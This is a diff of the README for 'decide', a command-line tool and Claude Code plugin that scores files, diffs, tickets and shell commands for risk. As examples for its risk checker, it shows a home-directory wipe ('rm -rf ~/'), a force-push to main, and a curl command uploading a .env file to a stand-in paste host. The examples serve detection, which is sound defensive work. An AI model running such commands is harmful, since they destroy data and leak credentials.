@@ -4,11 +4,41 @@
 [![Tests](https://img.shields.io/github/actions/workflow/status/deepnoodle-ai/decide/ci.yml?branch=main&style=flat-square&label=tests&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/actions/workflows/ci.yml)
 [![Release](https://img.shields.io/github/v/release/deepnoodle-ai/decide?style=flat-square&label=release&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/releases)
 
-**Ask a question about every file, ticket, diff, or line. Get back yes
-or no, a choice, or a score, each with a probability. No essay.**
+**Judgment calls, at scale.**
+
+Find the vulnerable function in a codebase, the urgent ticket in a
+queue, the risky change in a pull request. decide asks a decision model
+about every one, from your shell, CI, Go code, or Claude Code.
+
+A decision model doesn't write. It answers yes or no, a choice, or a
+score, with a probability, and it's fast and cheap enough to ask about
+every item. Act on the answers it's sure of, and send the close calls to
+a person.
+
+[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-8048b29e5adf.gif)](https://decide.deepnoodle.ai)
+
+**Docs: [decide.deepnoodle.ai](https://decide.deepnoodle.ai)**. Start
+with the [quickstart](https://decide.deepnoodle.ai/start/), then the
+[tutorials](https://decide.deepnoodle.ai/tutorials/check-agent-commands/)
+and [recipes](https://decide.deepnoodle.ai/recipes/). Go programs start
+with the [Go guide](https://decide.deepnoodle.ai/start/go/), and agents
+with the [agent guide](https://decide.deepnoodle.ai/reference/agents/).
+
+## Install
 
 ```sh
 brew install deepnoodle-ai/tap/decide
+```
+
+Or `go install github.com/deepnoodle-ai/decide/cmd/decide@latest`, or
+grab a binary from the [releases](https://github.com/deepnoodle-ai/decide/releases).
+Run `decide` on its own for a tour.
+
+## Try it
+
+Set a key and ask about one shell command:
+
+```sh
 export TYPESAFE_API_KEY=...   # a key from typesafe.ai
 
 echo 'rm -rf ~/' | decide run command-risk
@@ -28,42 +58,63 @@ Flagged: stdin:1
 See these results again with: decide runs view 20261008-040438-f7af
 ```
 
-That's it. One command in, typed answers out, each with a number a
-script can act on. A decision model answers with numbers, not prose.
-Put it in a git hook, a CI job, or an agent's loop.
+Four typed answers, each with a number a script can act on. Add
+`--fail-on flagged` and decide exits with code 2 when anything is
+flagged, so a git hook, a CI job, or an agent's loop can stop.
 
-[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-8048b29e5adf.gif)](https://decide.deepnoodle.ai)
+## In Claude Code
 
-**Docs: [decide.deepnoodle.ai](https://decide.deepnoodle.ai)**. Start
-with the [quickstart](https://decide.deepnoodle.ai/start/), then the
-[tutorials](https://decide.deepnoodle.ai/tutorials/check-agent-commands/)
-and [recipes](https://decide.deepnoodle.ai/recipes/). Agents can read the
-[agent guide](https://decide.deepnoodle.ai/reference/agents/).
-
-## Point it at anything
-
-```sh
-git diff | decide run code-risk                      # each changed file
-git diff | decide run code-risk --each function      # each changed function
-decide run security src                              # injection, SSRF, XSS, weak crypto
-decide run relevance docs -p question="pricing"      # which docs mention pricing?
-gh issue list --json number,title,body | decide run task-readiness
-gh pr view 42 --json number,title,body | decide run pr-description --fail-on flagged
-decide run receipt-quality receipt.jpg --provider openai
+```text
+/plugin marketplace add deepnoodle-ai/decide
+/plugin install decide@decide
 ```
 
-decide reads text, Markdown, source code, diffs, JSON, JSONL, CSV,
-images, audio, video, and PDFs. It splits them into items, asks about
-each one, and flags the answers that need a look.
+The plugin gives Claude a second opinion. It checks outside content
+before Claude acts on it, checks each shell command in bypass mode, and
+adds a judge tool for Claude's own questions. Two skills audit a whole
+codebase: `/decide:audit` scores every function for security bugs and
+Claude reads only the top ones, and `/decide:hunt` finds where a fixed
+bug was repeated. See the
+[Claude Code guide](https://decide.deepnoodle.ai/reference/claude-code/)
+and [plugin/README.md](plugin/README.md).
 
-- `--fail-on flagged` exits with code 2 when anything is flagged, so CI
-  can stop.
-- `decide runs view` shows the last run again, as text, JSON, CSV, or a
-  Markdown report.
-- A second run asks only about what changed. Answers are cached in
-  `~/.decide/cache`.
+## The small calls inside your automations
+
+Every pipeline has judgment calls that are too many for a person and too
+fuzzy for a rule. A few decide makes out of the box:
+
+```sh
+git diff main | decide run code-risk --fail-on flagged   # gate the merge
+echo "$CMD" | decide run command-risk --fail-on flagged  # check an agent's command
+decide run ticket-routing tickets.jsonl --field body     # route the queue
+decide run security src                                  # rank a codebase
+decide run receipt-quality receipts/ --provider openai   # read the photos
+decide run invoice-check invoices/ --provider gemini     # check the PDFs
+```
+
+## Reads text, code, images, audio, video, and PDFs
+
+Point decide at a file, a folder, a diff, or standard input. It splits
+what it finds into items and asks about each one:
+
+- **Text and Markdown**, by line, section, or file.
+- **Source code** in Go, Python, JavaScript, TypeScript, and Java, by
+  function, each sent with its imports. On a diff, only the functions
+  that changed.
+- **JSON, JSONL, and CSV**, by record, with `--field` to pick the text.
+- **Images, audio, video, and PDFs**, one item per file, with any
+  template. A screenshot of a diff works with `code-risk`.
+
+Long items are judged in parts. Every answer is cached in
+`~/.decide/cache`, so a second run asks only about what changed.
+Results print as text, JSON, CSV, a Markdown report, or GitHub Actions
+annotations. See [items](https://decide.deepnoodle.ai/reference/items/)
+and [output](https://decide.deepnoodle.ai/reference/output/).
 
 ## Twelve templates, built in
+
+A template is a set of questions in a few lines of JSON, with tuned
+wording and flag thresholds.
 
 | Template | Asks |
 | --- | --- |
@@ -80,14 +131,13 @@ each one, and flags the answers that need a look.
 | `receipt-quality` | Is this a readable receipt? (image) |
 | `invoice-check` | Is this a complete, paid invoice? (PDF, Gemini only) |
 
-A template is a set of questions in a few lines of JSON. Need a
-different one? `decide templates new NAME --from TEMPLATE` copies a
-template to edit. See [templates](https://decide.deepnoodle.ai/reference/templates/).
+Need a different question? `decide templates new NAME --from TEMPLATE`
+copies a template to edit. See
+[templates](https://decide.deepnoodle.ai/reference/templates/). To
+watch the templates catch something, the [demo](demo/README.md) is a
+small repository with planted problems.
 
-Want to see the templates catch something? The [demo](demo/README.md) is
-a small repository with planted problems.
-
-## Pick a model
+## Four decision models, one set of commands
 
 Jev is the default. Switch with `--provider cloudflare`, `openai`, or
 `gemini`, or set `DECIDE_PROVIDER`. Nothing else changes.
@@ -103,66 +153,11 @@ The [providers page](https://decide.deepnoodle.ai/reference/providers/)
 has file formats, size limits, and how to point decide at a
 Jev-compatible service you host yourself.
 
-## From Go
-
-```sh
-go get github.com/deepnoodle-ai/decide
-```
-
-```go
-client, err := decide.NewClient() // reads TYPESAFE_API_KEY
-if err != nil {
-	return err
-}
-e, err := decide.Eval(ctx, client, ticket, decide.Noul("Is this about billing?"))
-if err != nil {
-	return err
-}
-fmt.Println(e.Answer.Noul) // probability of yes, such as 0.97
-```
-
-Two calls and you have a probability. The [Go guide](https://decide.deepnoodle.ai/start/go/)
-walks through a first program.
-
-When you want more: [`templates`](templates) has the built-in questions,
-[`patterns`](patterns) turns answers into gates and rankings,
-[`decidetest`](decidetest) fakes the server in tests, and
-[`backend`](backend) creates clients for the other providers. The
-[reference](https://pkg.go.dev/github.com/deepnoodle-ai/decide) has the
-rest.
-
-## From Claude Code
-
-```text
-/plugin marketplace add deepnoodle-ai/decide
-/plugin install decide@decide
-```
-
-The plugin gives Claude a second opinion: it checks outside content
-before Claude acts on it, checks each shell command in bypass mode, and
-adds a judge tool and the `/decide:audit` and `/decide:hunt` skills. See
-the [Claude Code guide](https://decide.deepnoodle.ai/reference/claude-code/)
-and [plugin/README.md](plugin/README.md).
-
-## Install
-
-```sh
-brew install deepnoodle-ai/tap/decide
-```
-
-Or `go install github.com/deepnoodle-ai/decide/cmd/decide@latest`, or
-grab a binary from the [releases](https://github.com/deepnoodle-ai/decide/releases).
-Run `decide` on its own for a tour.
-
-## Status
-
-decide is young. Before v1, the library API and the CLI may change in
-any release.
-
 ## Contributing
 
 Issues and pull requests are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md)
 first, and report security issues as described in [SECURITY.md](SECURITY.md).
+Before v1, the library API and the CLI may change in any release.
 
 ## License
 
